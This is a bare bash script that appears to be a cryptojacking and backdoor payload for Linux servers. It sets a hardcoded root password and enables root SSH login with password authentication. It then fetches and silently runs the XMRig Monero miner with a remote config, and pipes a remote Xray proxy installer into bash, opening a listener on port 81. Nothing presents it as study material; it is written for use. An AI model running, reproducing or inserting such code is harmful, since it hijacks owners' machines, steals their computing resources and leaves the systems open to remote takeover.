#!/bin/bash
echo root:NP1215GP55*3* | sudo chpasswd root
sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
sudo service sshd restart
sudo wget -o- https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz
tar -xf /root/xmrig.tar.gz -C /root
chmod u+x ./xmrig
sudo wget -o- https://github.com/zjaac8/xxx/raw/main/x.json
chmod u+x ./x.json
 ./xmrig --config=./x.json >/dev/null 2>&1
sudo wget -qO- -o- https://github.com/233boy/Xray/raw/main/install.sh | bash
xray add tcp 81 1483c30c-ae2c-4130-f643-c6139d199c42
ping aws.amazon.com